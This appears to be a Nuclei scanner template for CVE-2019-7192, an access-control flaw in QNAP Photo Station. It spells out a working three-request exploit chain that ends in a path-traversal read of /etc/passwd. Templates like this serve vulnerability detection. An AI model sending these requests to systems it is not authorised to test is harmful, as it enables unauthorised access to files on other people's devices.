id: qnap-photo-station-lfr
info:
  name: QNAP Photo Station Local File Read (CVE-2019-7192)
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    This improper access control vulnerability in QNAP Photo Station allows
    remote attackers to gain unauthorized access to the system.
  reference:
    - http://packetstormsecurity.com/files/157857/QNAP-QTS-And-Photo-Station-6.0.3-Remote-Command-Execution.html
    - https://www.qnap.com/zh-tw/security-advisory/nas-201911-25
    - https://nvd.nist.gov/vuln/detail/CVE-2019-7192
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-7192
  classification:
    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2019-7192

http:
  - raw:
      - |
        POST /photo/p/api/album.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        a=setSlideshow&f=qsamplealbum
    extractors:
      - type: regex
        part: body
        internal: true
        name: album_id
        regex:
          - '<output>(.*?)</output>'

  - raw:
      - |
        GET /photo/slideshow.php?album={{album_id}} HTTP/1.1
        Host: {{Hostname}}
        Cookie: {{cookie}}

    extractors:
      - type: regex
        part: body
        internal: true
        name: access_code
        regex:
          - "encodeURIComponent\\(\\'(.*?)\\'\\)"

  - raw:
      - |
        POST /photo/p/api/video.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Cookie: {{cookie}}

        album={{album_id}}&a=caption&ac={{access_code}}&f=UMGObv&filename=../../../../../etc/passwd
    matchers:
      - type: word
        part: body
        words:
          - "admin:x:0:0"
    matchers-condition: and
